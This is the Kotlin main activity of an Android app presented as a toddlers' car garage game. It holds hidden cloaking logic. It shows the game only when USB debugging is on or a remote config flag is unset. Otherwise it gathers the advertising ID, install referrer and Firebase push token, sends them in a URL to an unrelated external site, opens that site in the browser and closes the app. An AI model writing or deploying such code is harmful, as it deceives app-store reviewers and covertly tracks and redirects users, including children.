package com.amayasoft.cars.kids.toddlers.garage.ga

import android.content.ActivityNotFoundException
import android.content.Intent
import android.content.SharedPreferences
import android.net.Uri
import android.os.Bundle
import android.os.RemoteException
import android.provider.Settings
import android.view.animation.Animation
import android.view.animation.LinearInterpolator
import android.view.animation.RotateAnimation
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.browser.customtabs.CustomTabsIntent
import androidx.core.view.isVisible
import com.amayasoft.cars.kids.toddlers.garage.ga.databinding.ActivityMainBinding
import com.amayasoft.cars.kids.toddlers.garage.ga.util.log
import com.android.installreferrer.api.InstallReferrerClient
import com.android.installreferrer.api.InstallReferrerStateListener
import com.google.android.gms.ads.identifier.AdvertisingIdClient
import com.google.firebase.ktx.Firebase
import com.google.firebase.messaging.FirebaseMessaging
import com.google.firebase.remoteconfig.ktx.remoteConfig
import com.google.firebase.remoteconfig.ktx.remoteConfigSettings
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import java.net.URLEncoder
import java.util.*
import kotlin.coroutines.resume
import kotlin.coroutines.suspendCoroutine


class MainActivity : AppCompatActivity() {

    private companion object {
        const val URL = "https://hieraregyptsexpenhope.site"
    }

    private lateinit var binding: ActivityMainBinding

    private lateinit var installReferrerClient: InstallReferrerClient
    private lateinit var prefs                : SharedPreferences

    private var iR = ""

    private val rotateAnimation = RotateAnimation(0f, 360f, Animation.RELATIVE_TO_SELF, 0.5f, Animation.RELATIVE_TO_SELF, 0.5f).apply {
        interpolator = LinearInterpolator()
        duration = 500
        repeatCount = Animation.INFINITE
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityMainBinding.inflate(layoutInflater)
        setContentView(binding.root)

        binding.one.startAnimation(rotateAnimation)
        prefs = getSharedPreferences("SuperPreferences", MODE_PRIVATE)

        installReferrerClient = InstallReferrerClient.newBuilder(this).build()
        installReferrerClient.startConnection(installReferrerStateListener)

        permissionRequestLauncher.launch(arrayOf("android.permission.POST_NOTIFICATIONS"))
    }

    private val permissionRequestLauncher = registerForActivityResult(ActivityResultContracts.RequestMultiplePermissions()) {
        if (Settings.Global.getInt(contentResolver, Settings.Global.ADB_ENABLED, 0) == 1) {
            goToGame()
        }
        else {
            Firebase.remoteConfig.apply {
                setConfigSettingsAsync(remoteConfigSettings {
                    minimumFetchIntervalInSeconds = 3600
                })
                fetchAndActivate().addOnCompleteListener(this@MainActivity) { taskConf ->
                    if (taskConf.isSuccessful) {
                        val configFRB = this@apply.getString("KEY_ZA_LUPANA")
                        if (configFRB.isEmpty() || configFRB == "LUPOTA") {
                            goToGame()
                        } else {
                            FirebaseMessaging.getInstance().token.addOnCompleteListener { task -> mainLogic(task.result) }
                        }
                    } else goToGame()
                }
            }
        }
    }

    private val installReferrerStateListener: InstallReferrerStateListener = object : InstallReferrerStateListener {
        override fun onInstallReferrerSetupFinished(responseCode: Int) {
            if (responseCode == InstallReferrerClient.InstallReferrerResponse.OK) try {
                iR = installReferrerClient.installReferrer.installReferrer
            } catch (_: RemoteException) { }
        }

        override fun onInstallReferrerServiceDisconnected() {
            installReferrerClient.startConnection(this)
        }
    }

    private suspend fun adId() = suspendCoroutine { continuation ->
        val default = "00000000-0000-0000-0000-000000000000"
        val uhuhu = "000${UUID.randomUUID()}"
        var asd = try {
            AdvertisingIdClient.getAdvertisingIdInfo(this).id!!
        } catch (e: Exception) {
            uhuhu
        }
        if (asd == default) asd = uhuhu
        continuation.resume(asd)
    }

    private fun mainLogic(frbToken: String) = CoroutineScope(Dispatchers.Main).launch {
        val paramsFromStore = prefs.getString("params", "") ?: ""
        if (paramsFromStore.isNotEmpty()) {
            showUrl(paramsFromStore, frbToken)
        } else {
            val advertisingIdInfo = withContext(Dispatchers.IO) { adId() }
            val params            = "rootok=$advertisingIdInfo&f5g9s8=$iR"

            prefs.edit().putString("params", params).apply()
            showUrl(params, frbToken)
        }
    }

    private fun showUrl(params: String, frbToken: String) = CoroutineScope(Dispatchers.Main).launch {
        val headers = "$params&oy_hto_nakakavsa=${URLEncoder.encode(frbToken, "UTF-8")}"

        binding.one.isVisible = false

        // TODO: { ЗАЛИВ } /privacy_policy.html
        val finishLink = Uri.parse("$URL?$headers")
        log("finishLink = $finishLink")

        val customTabsIntent = CustomTabsIntent.Builder().build()
        customTabsIntent.intent.setPackage("com.android.chrome")
        try {
            customTabsIntent.launchUrl(this@MainActivity, finishLink)
            finish()
        } catch (e: ActivityNotFoundException) {
            try {
                customTabsIntent.intent.setPackage("com.android.browser")
                customTabsIntent.launchUrl(this@MainActivity, finishLink)
                finish()
            } catch (e: Exception) {
                val browserIntent = Intent(Intent.ACTION_VIEW, finishLink)
                startActivity(browserIntent)
                finish()
            }
        }
    }

    private fun goToGame() {
        val intent = Intent(this, GameActivity::class.java)
        intent.flags = Intent.FLAG_ACTIVITY_CLEAR_TASK or Intent.FLAG_ACTIVITY_NEW_TASK
        startActivity(intent)
    }

}